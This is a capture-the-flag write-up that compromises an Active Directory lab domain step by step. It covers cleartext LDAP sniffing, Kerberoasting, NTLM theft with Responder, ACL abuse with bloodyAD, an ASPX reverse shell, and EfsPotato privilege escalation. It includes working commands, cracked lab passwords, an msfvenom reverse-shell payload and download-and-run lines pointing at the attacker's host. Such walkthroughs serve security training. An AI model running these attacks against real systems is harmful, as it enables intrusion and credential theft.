# Overview

This was a good lab with long attack chain. Starting from nothing finding an endpoint which allows you to download a application which allows you to intercept cleartext credentials. 

With the credentials obtained i was able to dump a user list and perform Kerberoasting agains `clerk.john`. This used had write access to the `uploads` folder which allowed me to place a malicious `.lnk` file in allowing me to obtain the NTLM hash for the user `jon.peters` 

`jon.peters` had generic write over 3 users, Nina, Paul and Maria which i could perform targeted Kerberoasting against, gain hashes and crack 2 off. (This being nina.sota and maria.clerk). The user Nina had read access to the `backup` share which then further leaked profile backups which exposed information on a potential privilege escalation route and credentials for the user `emma.hayes`

The user Emma had multiple outbound edges. First i had genericWrite over `Sam.brooks` allowing me to change the users password. This user was also in the `Remote Management Users` group allowing me to remotely login as the user using `winRM`. This paired with the fact that Emma could also grant herself GenericAll over the `CITYOPS` OU and have GenericWrite over the `Web_Admin` user allowed me move the user into the `CITYOPS` OU and then change the password for the user.

From here i authenticated as Sam, Uploaded `RunasCs.exe` and a `.aspx` reverse shell used `icacls` to grant the web_admin user privileges over the files and then finally used Runas to move the shell into the web root folder. I could then start a listener and catch a shell as the user apppool\defaultapppool.

Gaining SYSTEM access was an abuse of the `SeImpersonatePrivilege` which saw me compile a version of `EfsPotato` locally on the machine, uploading a `windows_reverse_tcp` shell and the executing it using the compiled binary. Resulting in full domain compromise. 

# Network Scan

```bash
$ nmap -sCV -p- -v -T4 $IP -oN nmap.out
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: City Hall - Your Local Government
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-22 12:25:16Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: city.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: city.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC-CC.city.local
| Issuer: commonName=DC-CC.city.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-10-21T12:19:14
| Not valid after:  2027-04-22T12:19:14
| MD5:     aaab f4e9 bafb 2900 6953 5c53 a57a 4620
| SHA-1:   6b08 19d6 0684 c440 cb97 0595 8516 b135 cc60 48a0
|_SHA-256: 4a9f 58f5 e6d1 f825 2058 63e6 ccbf 8589 10a8 e40d 78b5 2910 4c4a 14c3 8eb4 0d23
|_ssl-date: 2026-10-22T12:26:15+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: CITY
|   NetBIOS_Domain_Name: CITY
|   NetBIOS_Computer_Name: DC-CC
|   DNS_Domain_Name: city.local
|   DNS_Computer_Name: DC-CC.city.local
|   DNS_Tree_Name: city.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-10-22T12:26:06+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

# Unauthenticated Enumeration

After some digging round the webpage i find the endpoint `/documents-forms.html` which allows us to download a application that allows us to perform some LDAP task. These tasks are done over `LDAP` which is not encrypted so i was able to use `wireshark` to capture packets being sent from the application and expose cleartext credentials for `svc_services_portal`

I downloaded the windows version and used `wine` to run it.

<img width="1375" height="538" alt="image" src="https://github.com/user-attachments/assets/8a6637bf-dde7-4f09-8f8f-22f2e3dc1770" />


```bash
$ wine city_services_portal.exe   
it looks like wine32 is missing, you should install it.
multiarch needs to be enabled first.  as root, please
execute "dpkg --add-architecture i386 && apt-get update &&
apt-get install wine32:i386"
```

i then had a play about with the application and saw a console leaking important information.

<img width="1365" height="592" alt="image" src="https://github.com/user-attachments/assets/52dcd803-bfdf-414d-bd79-44d8b49f451b" />


As it stated that is was using LDAP... Not LDAPS i booted Wireshark and captured `tun0` traffic whilst running the request again

<img width="1383" height="318" alt="image" src="https://github.com/user-attachments/assets/0e3e712b-5c70-4242-9448-776d696956dd" />


I then found the password `PortAl1337`

# Enumeration as svc_services_portal

First i do all the standard enumeration

- Grab a users list via `nxc smb IP USER PASS --users-export users.txt`
- Perform AS-REP and KRB roasts (KRB was successful in getting hashes)
- Use `bloodhound-python` to collect data for bloodhound.

```bash
$ impacket-GetUserSPNs -dc-ip 10.1.90.196 city.local/svc_services_portal:'PortAl1337' -usersfile users.txt

/...SNip.../

$krb5tgs$23$*clerk.john$CITY.LOCAL$clerk.john*$77105e76e761183729446332588be343$ef0956d258b59e9b92667fe711d41de24eab9ed2e90c247c67d028f31e13ecf02d8ec64d0a8464cd76b004f3d45032915c9bbf8019b6bfd713e0966ae4ece0e0643cc534f6595ba13a446858afb866eef5edab454e09072b3b8846745b6c6a6ff3ef3c42db7a6fd8175849a9217d03b795b35af1b79704afb89a9ac421308b076cee116d81678a438d874afeebbd742412a435427c2def0605811ae9cae948f4197df4cadc426b6a2418582240048ce0b60f8a3e6d17fc25fdaca560e1a41eb50afc7b2f27ca0ba64fa9598f7d1a6f87338b117744646090110e3c69646da84ff941da1c04f40edf3d454414c35ddff5bfddeeaeeec0bf102e55aeba31f37067e87668b98d31ec0e99f7057eee4017f1350e19dd0e5effa1df332af855d7f221d5ebae54b80253f3c4297a0fed2862e0fcadc7d610cbfb567dd7b617c12c18a02a665906c4f785dbce534ed8859297d67063e94ed718de67138e409c2c4da2f7a125ee5adff64bb541eefe829d6745fd8f899d9b40056eb2f84ea212d1bc86f8a8329b01dd23a6d5dcefde9b3bc786ab07170f86cf50b2199988bf1f5a5ea33114fccf74dbac3d75f4b34f992d6c155e7bcb9290b7eb4db27c47655e9f6971548e80322dffc7e2f6ab982f4a22f92b693aa6f7eba35645e6387cfcd900f495b60b7ec782e596ae3ac1f92e4c555b238d877224b4e0b9bad0f3e8887428e68c932b7d7cd9a5597e993a9372b551b7a6d2917a2cb85ed43285bf307f21fd8debdf04949eba87b633295a0128317089f8a5d05f03f8c478d354994909ffb20db3607de008884f6a19403c53f8a6ecba1ce2fa0cb957ed5fc36d40862b8d7fb60e2a9c677022edacc65b10639a6d358ad9bed3c956a12c9a3d76374726612d1fd106d9da05b558bcf1d3d5515cb9ee6c200dc74e11c6fdd2cdc2ea294fc120720c19dadb24cb2e188d34398dda720d19fa837651d8e5932d878ebcf6fcb9ab707e2882437a9571ae474b0e466ce6f8537070cdb6ec185e67d9f5cc0d84101213970409541708cbb3a295a5c874238c4d9b3b468b3b1688d1e134db72ae6b4f27804995f37f085cbf241ed29b93d76eaef7eb7b74d23b2d4ff925996f3ad27948d150e891f73fd4861ee9732f3fa7c39f103e83862a2ebfec4608ac9e91d1f51503b1e6bb67912e38cc6f1d9a66a4c8250ae63b2b857ad7382de618e4d17697854a2184e2c2f8e5621527e37b31643fdbd7ddce46e9e0e01bd25033b875b9dda55f6113da42243646011a84feff713a578a2ec4ebf076add7f2468d672deecfa43a2c709d6fd915cc1978f62cca82795e9e0979ad8e4ced445e40c470caa523cd07ea3d490ec27d382ddf2b9421b688652dd069f8fb4c82b3fe87e5b40ac73690195e6d7878cff2908e7898cf7740ebeeacb8635454cc8015358f7cd007f036ddac643ee70982168bfc210f20010df3ff55d6c98a22f11f9a7f4ce25a3dc93a96ca08c2f2b68e82778c0116327ff45b37b1333622075f32c810938fd29a3197890d78e5cb1ebd17ccf13b26a4a9f79a2be83842933d3f41cf956dffabc1b290c6ad74257b975670d232a04792a9cb2fa6548b2fdb521cc7d3a20de1fa4a3b50ce737b3b7b63f9b647846e54702d7c0e46
```

I save the hash to a file and cracked with `hashcat -m 13100 john.hash rockyou.txt`

```
clerkhill
```

## Enumeration as clerk.john.

John has write access to the `uploads` share which i believe is linked to the web application meaning we will likely be able to upload a web shell and gain initial access. (This wasn't the case)

```bash
$ nxc smb 10.1.90.196 -u 'clerk.john' -p 'clerkhill' --shares                   
SMB         10.1.90.196     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.90.196     445    DC-CC            [+] city.local\clerk.john:clerkhill 
SMB         10.1.90.196     445    DC-CC            [*] Enumerated shares
SMB         10.1.90.196     445    DC-CC            Share           Permissions     Remark
SMB         10.1.90.196     445    DC-CC            -----           -----------     ------
SMB         10.1.90.196     445    DC-CC            ADMIN$                          Remote Admin
SMB         10.1.90.196     445    DC-CC            Backups                         
SMB         10.1.90.196     445    DC-CC            C$                              Default share
SMB         10.1.90.196     445    DC-CC            IPC$            READ            Remote IPC
SMB         10.1.90.196     445    DC-CC            NETLOGON        READ            Logon server share 
SMB         10.1.90.196     445    DC-CC            SYSVOL          READ            Logon server share 
SMB         10.1.90.196     445    DC-CC            Uploads         READ,WRITE
```

i did try uploading a web shell but got no luck accessing it. I then downloaded the eniter share and investigated the file. On file said that `jon.peters` now had `READ/WRITE` access to the share so i used `ntlm_theft` to create aload of files for `NTLM Coercion`

```bash
tlm_theft -g all -s 10.200.110.143 -f test
Created: test/test.scf (BROWSE TO FOLDER)
Created: test/test-(url).url (BROWSE TO FOLDER)
/...SNIP.../
Created: test/Autorun.inf (BROWSE TO FOLDER)
Created: test/desktop.ini (BROWSE TO FOLDER)
Created: test/test.theme (THEME TO INSTALL)
Created: test/test.bat (BROWSE TO FOLDER)
Generation Complete.
```

Start up responder...

```bash
$ sudo responder -I tun0
```

Upload a few files

```bash
$ smbclient -U clerk.john //10.1.90.196/Uploads
WARNING: no network interfaces found
Password for [WORKGROUP\clerk.john]:
Try "help" to get a list of possible commands.
smb: \> put test.lnk
putting file test.lnk as \test.lnk (5.8 kB/s) (average 5.8 kB/s)
smb: \> put test.url
test.url does not exist
smb: \> put test.scf
putting file test.scf as \test.scf (0.2 kB/s) (average 2.6 kB/s) 
```

Wait a few mins...

```
[SMB] NTLMv2-SSP Client   : 10.1.90.196
[SMB] NTLMv2-SSP Username : CITY\jon.peters
[SMB] NTLMv2-SSP Hash     : jon.peters::CITY:d13e26d40b12fa60:62EEBF330AD14800FA3A4B4ECA7276B0:01010000000000008041CEEB3362DD01E0D1244404FAEA880000000002000800380048004300480001001E00570049004E002D004E00310054005000380033005200510034004D00410004003400570049004E002D004E00310054005000380033005200510034004D0041002E0038004800430048002E004C004F00430041004C000300140038004800430048002E004C004F00430041004C000500140038004800430048002E004C004F00430041004C00070008008041CEEB3362DD0106000400020000000800300030000000000000000000000000200000887E00C4775796A6B5C93111884D8601D93176EFA09876A9EFDF13E371DCEDC70A001000000000000000000000000000000000000900260063006900660073002F00310030002E003200300030002E003100310030002E003100340033000000000000000000
```

```bash
$ echo 'jon.peters::CITY:d13e26d40b12fa60:62EEBF330AD14800FA3A4B4ECA7276B0:01010000000000008041CEEB3362DD01E0D1244404F/...SNIP.../
00310030002E003100340033000000000000000000' > jon.hash

$ hashcat -m 5600 jon.hash /usr/share/wordlists/rockyou.txt

1234heresjonny
```

## Enumeration as Jon.peters

Looking at bloodhound i can see jon have GenericAll over 3 other users:

- nina.soto
- maria.clerk
- paul.roberts

<img width="1374" height="556" alt="image" src="https://github.com/user-attachments/assets/7934135a-505e-4dc0-8ce3-39f69fb8f8a0" />


However none of these users have any special privileges compared to one another.

I will perform `targetted kerberoast` against each and see what i can crack.

First i create a file with all 3 user names

```bash
$ python3 ~/tools/windows/targetedKerberoast.py --dc-ip 10.1.90.196 -d city.local -u jon.peters -p 1234heresjonny --users-file trg_kerb
[*] Starting kerberoast attacks
[*] Fetching usernames from file
[+] Printing hash for (nina.soto)
$krb5tgs$23$*nina.soto$CITY.LOCAL$city.local/nina.soto*$b5fc100503aa74bd74b94a53669ed5f8$cf63ea59a4969253097c4fc30f5dedd2fdc48705d0f7141a004d5c08959ad03ec0d72aa93d9fd8781cfe556bd8b4692bf6c7c24ba4b7e4ef4c6519952a9d10f23d56a/...SNIP.../
[+] Printing hash for (maria.clerk)
$krb5tgs$23$*maria.clerk$CITY.LOCAL$city.local/maria.clerk*$9b9615e466d024c0a764f8f48b956c96$610641ed804130fd08356d06005a26ba7d73613278e161792364ac1cf449403742833bf7b0f35026f58068c7ae4671da33d8b64e02734c1fdb38189d23da97bb4/...SNIP.../
[+] Printing hash for (paul.roberts)
$krb5tgs$23$*paul.roberts$CITY.LOCAL$city.local/paul.roberts*$a7b9f102b85718a755c29501e954605e$b70ef464aff1f089d216a5f4b503be687f3e786f6f8075cf6d448be124b8f4ab15d48bacfcb9c68a3373941140a6cae9a24788687e474f1c8548f4d8432707b/...SNIP.../
```

```
$ hashcat -a0 -m 13100 maria.hash /usr/share/wordlists/rockyou2.txt

mariadbzt1221

$ hashcat -a0 -m 13100 nina.hash /usr/share/wordlists/rockyou2.txt

123nina321
```

# Enumeration as nina.soto

```bash
$ nxc smb 10.1.90.196 -u 'nina.soto' -p '123nina321' --shares  
SMB         10.1.90.196     445    DC-CC            [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-CC) (domain:city.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.1.90.196     445    DC-CC            [+] city.local\nina.soto:123nina321 
SMB         10.1.90.196     445    DC-CC            [*] Enumerated shares
SMB         10.1.90.196     445    DC-CC            Share           Permissions     Remark
SMB         10.1.90.196     445    DC-CC            -----           -----------     ------
SMB         10.1.90.196     445    DC-CC            ADMIN$                          Remote Admin
SMB         10.1.90.196     445    DC-CC            Backups         READ            
SMB         10.1.90.196     445    DC-CC            C$                              Default share
SMB         10.1.90.196     445    DC-CC            IPC$            READ            Remote IPC
SMB         10.1.90.196     445    DC-CC            NETLOGON        READ            Logon server share 
SMB         10.1.90.196     445    DC-CC            SYSVOL          READ            Logon server share 
SMB         10.1.90.196     445    DC-CC            Uploads 
```

Nina has access to the `backup` share which contained Profile backups for `sam.brooks` and `clerk.john`

i downloads the whole share using `smbclient` with `prompt off; recurse on; mget *`

Looking in the share i found to `.wim` files which i mounted to folders using `wimtools`

```bash
$ ls
clerk.john_ProfileBackup_0729.wim  sam.brooks_ProfileBackup_0728.wim

$ mkdir /mnt/sam_wim
$ mkdir /mnt/john

$ wimmount sam.brooks_ProfileBackup_0728.wim 1 /mnt/sam_wim
$ wimmount clerk.john_ProfileBackup_0729.wim 1 /mnt/john_wim
```

I find the credentials for `emma.hayes` in johns `ConsoleHistory` file.

```bash
# cat Anwendungsdaten/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt
cmdkey /add:city-dc /user:city.local\emma.hayes /pass:!Gemma4James!
cmdkey /add:DC-CC.city.local /user:emma.hayes /pass:!Gemma4James!
```

I also find a message on `sams` desktop regarding the `web_Admin` service account being disabled but `emma` being able to enable it. This is due to vulnerablites in based on `.aspx` files being uploads to escalate privileges.

```bash
# cat message_sam.eml                                               
Subject: Notice: web_admin account moved to Quarantine OU

Hi Sam,

This is to inform you that the web_admin account has been moved to the Quarantine OU following security concerns identified during recent system activity.
The web server has ASP.NET enabled and file uploads of .aspx pages are possible; in combination with the web_admin account this creates a scenario could be used to escalate privileges or perform unauthorized actions.

No production impact has been confirmed, but the account has been isolated for forensic review as a precautionary measure.

If you require any temporary access or need updates regarding the investigation, please contact Emma Hayes (Helpdesk) at emma.hayes for coordination and approval.
```

# Enumeration as Emma

<img width="1380" height="684" alt="image" src="https://github.com/user-attachments/assets/a216055c-e5a5-4c3c-92e9-9e5171e9327f" />


Information i took away from this:
- Sam.brooks is in `Remote Management Users` meaning we should be able to get a shell as we have `WriteDACL` over.
- Emma hash `GenericWrite` Over `Quarantine` meaning i can enable `web_admin` 
- Emma has `GenericeWrite` `Web_Admin` meaning i should be able to take controll off that account also.

To start with i add `GenericAll` to `Sam.Brooks` for the `emma.hayes`. I can then change Sams password.

```bash
 $ bloodyad --host 10.1.90.196 -d city.local -u emma.hayes -p '!Gemma4James!' set password sam.brooks 'NewPass!23'                      
[+] Password changed successfully!
```

I try to log in as sam but find the account is disabled so i remove the `DISBALEACCOUNT` flag from the `userAccountControl`

```bash
$ bloodyad --host 10.1.90.196 -d city.local -u emma.hayes -p '!Gemma4James!' remove uac sam.brooks -f ACCOUNTDISABLE
[+] ['ACCOUNTDISABLE'] property flags removed from sam.brooks's userAccountControl
```

I can then login as sam and get the user flag from the desktop.

```bash
$ evil-winrm -i 10.1.90.196 -u sam.brooks -p 'NewPass!23'

*Evil-WinRM* PS C:\Users\sam.brooks\desktop> cat user.txt
```


## Changing an object OU

First i need to grant Generic all over the `CityOps` OU.

```bash
$ bloodyad --host 10.1.90.196 -d city.local -u emma.hayes -p '!Gemma4James!' add genericAll "OU=CITYOPS,DC=CITY,DC=LOCAL" emma.hayes 
[+] emma.hayes has now GenericAll on OU=CITYOPS,DC=CITY,DC=LOCAL
```

```bash
$ bloodyad --host 10.1.90.196 -d city.local -u emma.hayes -p '!Gemma4James!' set object web_admin distinguishedName -v 'CN=WEB ADMIN,OU=CITYOPS,DC=CITY,DC=LOCAL' 
[+] web_admins distinguishedName has been updated

# Verify The change

$ bloodyad --host 10.1.90.196 -d city.local -u emma.hayes -p '!Gemma4James!' get object web_admin --attr distinguishedname                                       

distinguishedName: CN=WEB ADMIN,OU=CityOps,DC=city,DC=local
```

I then change webadmins password.

```bash
$ bloodyad --host 10.1.90.196 -d city.local -u emma.hayes -p '!Gemma4James!' set password web_Admin 'NewPass!23'
[+] Password changed successfully!
```

# Gaining a shell as iis apppool\defaultapppool

first i download a `.aspx` rev shell.

https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx

i then modify the IP and PORT in the script.

```aspx
protected void Page_Load(object sender, EventArgs e)
    {
	    String host = "127.0.0.1"; //CHANGE THIS
            int port = 1234; ////CHANGE THIS
                
        CallbackShell(host, port);
    }
```

Next i upload the file to Windows Temp using a python server and `Invoke-WebRequest`

```powershell
$ iwr -uri http://10.200.10.111:8000/shell.aspx -outfile C:\Temp\Shell.aspx
iwr -uri http://10.200.10.111:8000/RunasCs.exe -outfile C:\Temp\run.exe
```

Next i modify the permissions on `shell.aspx` so the user `web_Admin` can move it and finally move it into the web root.

```powershe;;
*Evil-WinRM* PS C:\temp> icacls "C:\temp\shell.aspx" /grant "CITY\web_admin:(F)"

processed file: C:\temp\shell.aspx
Successfully processed 1 files; Failed processing 0 files


*Evil-WinRM* PS C:\temp> .\run.exe web_admin 'NewPass!23' "cmd /c move C:\temp\shell.aspx 
C:\inetpub\wwwroot\shell.aspx" 

[*] Warning: User profile directory for user web_admin does not exists. Use --force-profile if you want to force the creation
[*] Warning: The logon for user 'web_admin' is limited. Use the flag combination --bypass-uac and --logon-type '5' to obtain ken.

        1 file(s) moved.
```

Next i start a listener using `netcat` 

```bash
$ nc -lvnp 4444
```

and then visit the webpage.

```
http://city.local/shell.aspx
```

i then get a shell as iis apppool\defaultapppool

# Abusing SeImpersonatePriv

iis apppool\defaultapppool has the `SeImpersonatePriv` Enabled.

I then need to check what Frameworks i have on the system. To do this i check `C:\Windows\Microsoft.net\Framework`

And see the following

```
 Directory: C:\Windows\Microsoft.net\Framework


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/15/2018  12:19 AM                v1.0.3705                                                             
d-----        9/15/2018  12:19 AM                v1.1.4322                                                             
d-----       10/24/2025   6:50 AM                v2.0.50727                                                            
d-----       10/24/2025   6:50 AM                v3.0                                                                  
d-----       10/24/2025   6:50 AM                v3.5                                                                  
d-----       10/22/2026   6:17 AM                v4.0.30319
```

The box has V4. Next i need to see if it has `csc.exe` within in the `v4.0.303.19` folder (Which it does) This means i can complie the exploit locally and bypass Window AV.

I clone the `efsPotato` repo and transfer to the target.

https://github.com/zcgonvh/efspotato

On the target i compile the exploit.

```powershell
PS C:\temp> C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618
```

This leaves me with `EfsPotato.exe` which i test it working correctly by running a simple whoami

```powershell
PS C:\temp> .\EfsPotato.exe whoami
.\EfsPotato.exe whoami
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: IIS APPPOOL\DefaultAppPool
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=13026d0)
[+] Get Token: 884
[!] process with pid: 5548 created.
==============================
nt authority\system
```

`NT Authority\System` confirmed i upload a new revshell made with `msfvenom`

```bash
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.200.110.143 LPORT=4445 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7680 bytes
Saved as: rev.exe

$ python3 -m http.server 8000
```

On the target

```powershell
PS C:\temp> iwr -uri http://10.200.110.143:8000/rev.exe -outfile rev1.exe

PS C:\temp> .\EfsPotato "cmd.exe /c C:\Temp\rev1.exe"
.\EfsPotato "cmd.exe /c C:\Temp\rev1.exe"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: IIS APPPOOL\DefaultAppPool
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=d65200)
[+] Get Token: 824
[!] process with pid: 4540 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818
```

Then catch a shell on the Listener

```bash
$ nc -lvnp 4445      
listening on [any] 4445 ...
connect to [10.200.110.143] from (UNKNOWN) [10.1.90.196] 50403

C:\temp>powershell

PS C:\temp> cd C:\Users\Administrator\Desktop

PS C:\Users\Administrator\Desktop> cat root.txt

REDACTED
```
